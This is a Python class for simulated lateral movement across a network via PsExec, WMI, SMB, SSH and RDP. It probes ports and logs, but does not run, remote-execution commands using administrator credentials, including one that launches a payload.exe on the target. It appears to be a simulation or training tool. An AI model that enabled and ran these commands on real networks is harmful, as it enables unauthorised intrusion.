import socket
import logging
import subprocess
import platform

class LateralMovement:
    def __init__(self, target, technique):
        self.target = target
        self.technique = technique
        self.logger = logging.getLogger(__name__)
        self.system = platform.system().lower()

    def move(self):
        self.logger.info(f"Attempting lateral movement to {self.target} using {self.technique}")

        if self.technique == 'psexec':
            return self._psexec_movement()
        elif self.technique == 'wmi':
            return self._wmi_movement()
        elif self.technique == 'smb':
            return self._smb_movement()
        elif self.technique == 'ssh':
            return self._ssh_movement()
        elif self.technique == 'rdp':
            return self._rdp_movement()
        else:
            self.logger.error(f"Unknown lateral movement technique: {self.technique}")
            return False

    def _psexec_movement(self):
        """Use PsExec for lateral movement (Windows)"""
        try:
            # Check if target is reachable
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, 445))
            sock.close()

            if result != 0:
                self.logger.error(f"Target {self.target} not reachable on SMB port")
                return False

            # Simulate PsExec execution
            command = f"psexec \\\\{self.target} -u administrator -p password cmd.exe /c whoami"
            self.logger.info(f"Would execute: {command}")

            # In real scenario, this would execute PsExec
            # result = subprocess.run(command, shell=True, capture_output=True, text=True)
            # return result.returncode == 0

            return True  # Simulated success
        except Exception as e:
            self.logger.error(f"PsExec lateral movement failed: {e}")
            return False

    def _wmi_movement(self):
        """Use WMI for lateral movement (Windows)"""
        try:
            # Simulate WMI query and execution
            wmi_command = f'wmic /node:"{self.target}" /user:"administrator" /password:"password" process call create "cmd.exe /c whoami"'
            self.logger.info(f"Would execute WMI command: {wmi_command}")

            # In real scenario:
            # result = subprocess.run(wmi_command, shell=True, capture_output=True, text=True)
            # return result.returncode == 0

            return True  # Simulated success
        except Exception as e:
            self.logger.error(f"WMI lateral movement failed: {e}")
            return False

    def _smb_movement(self):
        """Use SMB for lateral movement"""
        try:
            # Check SMB port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, 445))
            sock.close()

            if result != 0:
                self.logger.error(f"SMB not available on {self.target}")
                return False

            # Simulate SMB file copy and execution
            copy_command = f"net use \\\\{self.target}\\C$ /user:administrator password"
            exec_command = f"psexec \\\\{self.target} C:\\Windows\\Temp\\payload.exe"

            self.logger.info(f"Would execute: {copy_command}")
            self.logger.info(f"Would execute: {exec_command}")

            return True  # Simulated success
        except Exception as e:
            self.logger.error(f"SMB lateral movement failed: {e}")
            return False

    def _ssh_movement(self):
        """Use SSH for lateral movement (Unix/Linux)"""
        try:
            import paramiko

            # Simulate SSH connection
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # In real scenario, use actual credentials
            # ssh.connect(self.target, username='user', password='password')

            self.logger.info(f"Would establish SSH connection to {self.target}")
            self.logger.info("Would execute remote commands via SSH")

            # Simulate command execution
            # stdin, stdout, stderr = ssh.exec_command('whoami')
            # result = stdout.read().decode()

            ssh.close()
            return True  # Simulated success
        except ImportError:
            self.logger.error("Paramiko not available for SSH lateral movement")
            return False
        except Exception as e:
            self.logger.error(f"SSH lateral movement failed: {e}")
            return False

    def _rdp_movement(self):
        """Use RDP for lateral movement (Windows)"""
        try:
            # Check RDP port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, 3389))
            sock.close()

            if result != 0:
                self.logger.error(f"RDP not available on {self.target}")
                return False

            # Simulate RDP connection
            rdp_command = f'mstsc /v:{self.target} /user:administrator /pass:password'
            self.logger.info(f"Would execute RDP connection: {rdp_command}")

            return True  # Simulated success
        except Exception as e:
            self.logger.error(f"RDP lateral movement failed: {e}")
            return False